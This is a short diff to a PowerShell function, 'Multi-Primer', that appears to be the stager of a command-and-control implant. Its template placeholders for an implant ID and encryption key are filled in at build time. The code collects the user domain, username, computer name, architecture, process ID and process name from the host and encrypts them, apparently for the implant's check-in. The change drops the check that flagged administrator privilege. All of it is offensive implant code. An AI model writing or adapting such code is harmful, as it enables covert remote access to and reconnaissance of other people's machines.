@@ -87,9 +87,7 @@ function Multi-Primer($url,$uri,$df) {
     $script:h=$df
     $cu = [System.Security.Principal.WindowsIdentity]::GetCurrent()
     $wp = New-Object System.Security.Principal.WindowsPrincipal($cu)
-    $ag = [System.Security.Principal.WindowsBuiltInRole]::Administrator
     $procname = (Get-Process -id $pid).ProcessName
-    if ($wp.IsInRole($ag)){$el="*"}else{$el=""}
     try{$u=($cu).name+$el} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
     $o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$procname;#REPLACEURLID#"
     try {$pp=Encrypt-String -key #REPLACEKEY# -un $o} catch {$pp="ERROR"}
